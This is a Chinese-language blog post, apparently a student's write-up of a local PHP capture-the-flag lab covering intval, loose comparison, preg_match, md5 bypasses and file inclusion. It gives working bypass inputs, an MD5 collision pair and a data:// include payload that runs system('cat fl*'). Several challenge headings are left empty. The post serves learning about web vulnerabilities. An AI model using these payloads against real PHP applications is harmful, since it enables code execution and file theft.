---
layout: post
title: php+文件包含（hubu
date: 2024-12-11 22:14:51 +0800
categories: [web]
---

靶场打开方式：

cd ctf_web
ls
php -S 0.0.0.0:10024

然后成功
输入网址http://192.168.227.128:10024/  打开
（不记得ip就用ifconfig查，直接ifconfig）

## php特性

<mark>intval</mark>（）
用于获取变量的整数值
**intval()** 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

int intval ( mixed $var [, int $base = 10 ] )
参数说明：
- $var：要转换成 integer 的数量值。
- $base：转化所使用的进制。
如果 base 是 0，通过检测 var 的格式来决定使用的进制：
- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)。
成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1
     ==特别的，1e3=1000==


<mark>弱比较</mark> ==
会进行类型转换

![]({{ site.baseurl }}/assets/images/4091f1326734e9e5202678100b69796a.png)

**var_dump()** 函数用于输出变量的相关信息。
**var_dump()** 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。
没有返回值。

preg_match 函数用于执行一个正则表达式匹配。
返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。
/* 模式中的 \b 标记一个单词边界，所以只有独立的单词"web"会被匹配，而不会匹配 * 单词的部分内容比如"webbing" 或 "cobweb" */ if (preg_match("/\bweb\b/i"

#### 1.php

intval() 特性: 遇到非数字字符停止转换 && 强比较
 
    `<?php  
    
    include("flag.php");   
    highlight_file(__FILE__);   
    if(isset($_GET['num'])){   
        $num = $_GET['num'];      
        if($num === "114514"){         // 强比较,不会进行类型转换       
        die("no no no!");      
         }   if (intval($num) == 114514 ){           
        echo $flag;       
        }else{           
        echo intval($num,0);     
               }   
        }   
    ?>`


num是get传参
和114514强比较，如果等于就返回nonono，所以要不是
if (intval($num) == 114514 ){        echo $flag;  }
所以还要满足intval()，所以应该是要值也等于114514
但是它遇到非数字字符会停止
那么就好做了，get传参一个114514a
得到flag
HUBUMARS{This_is_a_flag}

#### 1_1.php

intval($num,0) && 弱比较

    `<?php      
    
    include("flag.php");   
    highlight_file(__FILE__);  
     if(isset($_GET['num'])){    
     $num = $_GET['num'];       
     if($num == 114514 ){  // 弱比较,会进行类型转换        
     die("no no no!");       }       
     if(intval($num,0) == 114514 ){   // 0 表示自己判断进制       
     echo $flag;       }
     else{           
     echo intval($num,0);      
               }   
       }  
      ?>`

这个跟之前差不多，这个开始弱比较，所以带字符也没关系？
（这里理解有点偏差5555
后面intval因为后面是0所以看num来决定进制
因为输入的开头是1所以应该是使用十进制（其实这些都不太影响）
和之前一样get传参114514a
得到flag 


#### 1_2.php

intval($num,0) && 禁止出现非数字字符

    `<?php   
    
    include("flag.php");   
    highlight_file(__FILE__);   
    $num = $_GET['num'];   
    if (isset($num)) {    // var_dump($num == "114514");   
     if($num == 114514){           
     die("禁止输入114514+++++++++");       }    // 如果含有非数字的字符,die    
     if(preg_match("/[a-z]/i", $num)){           ////模式分隔符后的"i"标记这是一个大小写不敏感的搜索
     die("您的输入含有非数字字符");       }       i
     f(intval($num,0) == 114514){           
     echo $flag;       }
     else{          
      echo intval($num,0); 
            }  
        }  
     ?>`


preg_match("/[a-z]/i", $num))       ////模式分隔符后的"i"标记这是一个大小写不敏感的搜索
这里就是查找匹配的a到z的字符（大写也不行，好像就是字母都不行）
要绕过这个规定，
输入114514$发现成功得到flag
这个不能用十六进制，用033
#### 2.php

 Bypass preg_match() | object

    `<?php      
    include("flag.php");  
     ini_set("display_errors", "On");  // 开启错误显示  
      highlight_file(__FILE__);   
      if(isset($_GET['str'])){    
      $str = $_GET['str'];    // 过滤所有可打印的字符串    
      if(preg_match("/^[\x20-\x7E]+$/", $str)){           
      die("Stop hacking!");       }          
      echo $flag;   } 
      else {      
       echo "Please input str";   }   `
       
       Please input str
过滤十六进制的20到7E，也就是ASCII字符
说是数组str[]=1，但是我这边只有保错没有flag很奇怪

`ini_set("display_errors", "On");`
这个是会报错显示，所以可以用报错来

也可以输入包含一些不可打印字符，比如：
URL 编码的控制字符，例如 %00（NULL 字符），可以尝试构造 URL 为：?str=%00
或者尝试其他非可打印的字符，例如：特殊字符，如换行符、制表符等
输入?str=%0A也可以,换行的


#### 2_1.php

 Bypass preg_match() | 多行匹配

    `<?php   
    highlight_file(__FILE__);   
    include('flag.php');   
    $a=$_GET['str'];   
    // echo $a,'<br>';   
    var_dump($a == 'aaa\nphp');  
     if(preg_match('/^php$/im', $a)){       
        if(preg_match('/^php$/i', $a)){           
         echo 'hacker';       }       
        else{          
            echo $flag;  
               }  
        }  
    else{       
            echo 'nonononono';  
             }` 
             
        bool(false) nonononono

preg_match('/^php$/<mark>**im**</mark>', $a)：
    /m (multiline) 模式允许 ^ 和 $ 匹配每一行的开头和结尾。
    由于正则使用了 m，我们可以尝试利用换行符。
这里i应该是单行，**m是逐行每一行，所以应该要换行输入php**
preg_match('/^php$/i', $a)：
    /i (case-insensitive) 模式忽略大小写。

![]({{ site.baseurl }}/assets/images/Pasted image 20241020111547.png)

<mark>换行URL是%0A</mark>
输入?str=aaa%0aphp
?str=aaa\n%0Aphp
可得flag

#### 3.php
    md5() 弱比较 Bypass
常规的MD5绕过，弱比较
直接get传参
?str1=QNKCDZO&str2=240610708

#### 3_1.php
    md5() 强比较 Bypass

经典的哈希碰撞问题
?str1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&str2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
#### zonghe1.php

![]({{ site.baseurl }}/assets/images/屏幕截图 2024-10-20 123832.png)
![]({{ site.baseurl }}/assets/images/Pasted image 20241020123856.png)

<mark>strlen</mark>($ _GET['num'])<=3 &$_GET['num']>999999999`
<mark>长度</mark>小于等于3位，需要数字大于 999999999
由1e3=1000可以知道
所以这里可以传参2e9这种，肯定大于 999999999
成功

<mark>preg_replace(</mark>'/HUBUMARS/', "", $_GET['str']):
正则表达式：/HUBUMARS/ 用于匹配字符串中的 HUBUMARS。
替换为空：<mark>将匹配到的部分替换为空字符串，即删除它们</mark>。
输入来源：$_GET['str'] 是用户通过 URL 参数 str 提供的输入。

要输入HUBUMARS，但是这里遇到会换成空字符
所以可以插入打散输入，HUBUHUBUMARSMARS这样
中间有个HUBUMARS被换成空然后前后HUBU和MARS连接起来一样传参

if(isset($ _ POST['md5_1']) & &isset($_POST['md5_2'])){
使用 isset() 函数来确保 md5_1 和 md5_2 参数都存在于 POST 请求中
if(is_string($ _POST['md5_1'])&&is_string($_POST['md5_2'])){
使用 is_string() 函数检查这两个参数是否都是字符串类型。
所以用post传参字符串就行
因为是弱比较，然后它们md5值相等
传常规的0e绕过就行
md5_1=QNKCDZO&md5_2=240610708

## 文件包含
LFL

include( )
当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含
进来，发生错误时之给出一个警告，继续向下执行。
include_once( )
功能与 Include()相同，区别在于**当重复调用同一文件时，程序只调用一次**
require( )
require()与 include()的区别在于 require()执行如果发生错误，函数会输出
错误信息，并终止脚本的运行。
require_once( )
功能与 require()相同，区别在于**当重复调用同一文件时，程序只调用一次**。

#### include.php



#### include_once.php
     include_once()




#### require.php

#### require_once.php

#### challenge1.php

#### challenge2.php

#### challenge3.php

#### challenge4.php


//rot1向右移动13位，两次之后字母还原
//base64编码中输入网址，加号+会被浏览器理解为空格，这时想要正确输入就可以URL编码一下

data协议




把php换成了???
用data协议
?file=data ://text/plain,<?=system("cat fl*");?>
data ://text/plain;base64,
使用php input协议




data不能用了





本地文件包含和远程文件包含
前面都是本地文件包含
后面的是远程文件包含


SFVCVU1BUlN7Y2E2ZTVmODItODg0My0xMWVmLTkzYzMtMDAxNTVkYTFmMThlfQo=
回去
